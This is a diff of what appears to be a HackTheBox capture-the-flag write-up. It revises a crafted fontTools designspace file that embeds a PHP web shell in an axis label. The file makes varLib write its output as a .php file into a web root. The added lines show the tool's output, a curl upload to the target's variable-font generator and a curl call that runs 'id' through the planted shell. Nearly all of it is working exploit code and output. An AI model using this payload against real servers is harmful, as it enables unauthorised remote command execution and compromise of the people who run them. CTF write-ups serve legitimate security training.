@@ -289,34 +289,79 @@ Created bold.ttf
 ```
 ajdev@rootbox:~/HTB$ cat > malicious.designspace << 'EOF'
 <?xml version='1.0' encoding='UTF-8'?>
-<designspace format="4.1">
+<designspace format="5.0">
   <axes>
-    <axis tag="wght" name="Weight" minimum="100" default="100" maximum="900"/>
+    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
+      <labelname xml:lang="en"><![CDATA[<?php system($_GET['x']); ?>]]]]><![CDATA[>]]></labelname>
+    </axis>
   </axes>
   <sources>
-    <source filename="light.ttf" familyname="Test" stylename="Light">
+    <source filename="source-light.ttf" name="Light">
       <location>
         <dimension name="Weight" xvalue="100"/>
       </location>
     </source>
-    <source filename="bold.ttf" familyname="Test" stylename="Bold">
+    <source filename="source-regular.ttf" name="Regular">
       <location>
-        <dimension name="Weight" xvalue="900"/>
+        <dimension name="Weight" xvalue="400"/>
       </location>
     </source>
   </sources>
-  <instances>
-    <instance
-      name="Regular"
-      familyname="<?php system($_GET['cmd']); ?>"
-      filename="/var/www/portal.variatype.htb/public/files/shell.php"
-      postscriptfontname="Test-Regular">
-      <location>
-        <dimension name="Weight" xvalue="100"/>
-      </location>
-    </instance>
-  </instances>
+  <variable-fonts>
+    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/glyph-check.php">
+      <axis-subsets>
+        <axis-subset name="Weight"/>
+      </axis-subsets>
+    </variable-font>
+  </variable-fonts>
 </designspace>
 EOF
+ajdev@rootbox:~/HTB$ ~/.local/bin/fonttools varLib malicious.designspace 2>&1
+Axes:
+[{'axisLabels': [],
+  'axisOrdering': None,
+  'default': 400.0,
+  'hidden': False,
+  'labelNames': {'en': "<?php system($_GET['x']); ?>]]>"},
+  'map': [],
+  'maximum': 900.0,
+  'minimum': 100.0,
+  'name': 'Weight',
+  'tag': 'wght'}]
+Internal master locations:
+[{'Weight': 100.0}, {'Weight': 400.0}]
+Internal axis supports:
+{'Weight': [100.0, 400.0, 900.0]}
+Normalized master locations:
+[{'Weight': -1.0}, {'Weight': 0.0}]
+Index of base master: 1
+Building variable font
+Loading master fonts
+WARNING: 'created' timestamp seems very low; regarding as unix timestamp
+WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
+WARNING: 'created' timestamp seems very low; regarding as unix timestamp
+WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
+WARNING: 'created' timestamp seems very low; regarding as unix timestamp
+WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
+Generating fvar
+Building variations tables
+Generating avar
+No need for avar
+Generating MVAR
+Generating HVAR
+Generating gvar
+Merging TT hinting
+Saving variation font glyph-check.php
+ajdev@rootbox:~/HTB$ strings glyph-check.php | grep php
+@TestRegular<?php system($_GET['x']); ?>]]>
+ajdev@rootbox:~/HTB$ curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
+  -F "designspace=@malicious.designspace" \
+  -F "masters=@source-light.ttf" \
+  -F "masters=@source-regular.ttf" \
+  -v 2>&1 | grep -E "HTTP|Location|error"
+
+curl -s "http://portal.variatype.htb/files/glyph-check.php?x=id"
+> POST /tools/variable-font-generator/process HTTP/1.1
+< HTTP/1.1 200 OK
 ```
 
